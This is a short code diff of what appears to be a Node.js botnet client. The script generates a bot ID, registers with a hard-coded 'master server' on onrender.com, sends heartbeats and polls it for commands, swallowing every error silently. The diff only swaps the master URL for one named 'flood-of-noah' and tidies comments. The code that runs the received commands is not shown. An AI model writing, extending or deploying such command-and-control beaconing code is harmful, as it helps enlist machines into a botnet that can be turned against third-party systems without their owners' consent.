@@ -19,8 +19,8 @@ function generateBotId() {
 // ========== CONFIGURATION ==========
 const BOT_ID = generateBotId();
 const BOT_NAME = process.env.BOT_NAME || `Bot-${Math.floor(Math.random() * 10000)}`;
-const MASTER_SERVER = process.env.MASTER_SERVER || 'https://hello-kutty-k7d3.onrender.com';
-const PORT = 0; // random port
+const MASTER_SERVER = process.env.MASTER_SERVER || 'https://flood-of-noah-7bs7.onrender.com';
+const PORT = 0; // random available port
 
 let registrationAttempts = 0;
 const MAX_REGISTRATION_ATTEMPTS = 5;
@@ -330,10 +330,8 @@ async function autoRegister() {
 async function sendHeartbeat() {
     try {
         await axios.post(`${MASTER_SERVER}/heartbeat`, { id: BOT_ID }, { timeout: 5000 });
-        // Optional: log heartbeat (too noisy)
-        // console.log(`[HEARTBEAT] Sent`);
     } catch (error) {
-        // Silently fail
+        // silently fail
     }
 }
 
@@ -357,7 +355,7 @@ async function checkForCommands() {
             }
         }
     } catch (error) {
-        // Silently fail
+        // silently fail
     }
 }
 
